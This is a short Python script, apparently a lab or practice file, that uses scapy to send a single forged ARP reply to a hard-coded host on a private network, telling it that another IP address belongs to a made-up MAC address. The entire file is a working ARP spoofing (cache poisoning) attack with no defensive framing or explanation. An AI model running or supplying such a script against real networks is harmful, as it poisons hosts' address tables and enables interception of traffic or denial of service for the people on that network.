from scapy.all import ARP, send,time

target_ip = "192.168.28.172"
target_mac = "00:50:56:AE:8E:0B"
spoof_ip = "192.168.28.191"


fake_mac = "12:34:56:78:9a:bc"

arp_response = ARP(
    op=2,
    pdst=target_ip,
    hwdst=target_mac,
    psrc=spoof_ip,
    hwsrc=fake_mac  
)

send(arp_response, verbose=True)

#123
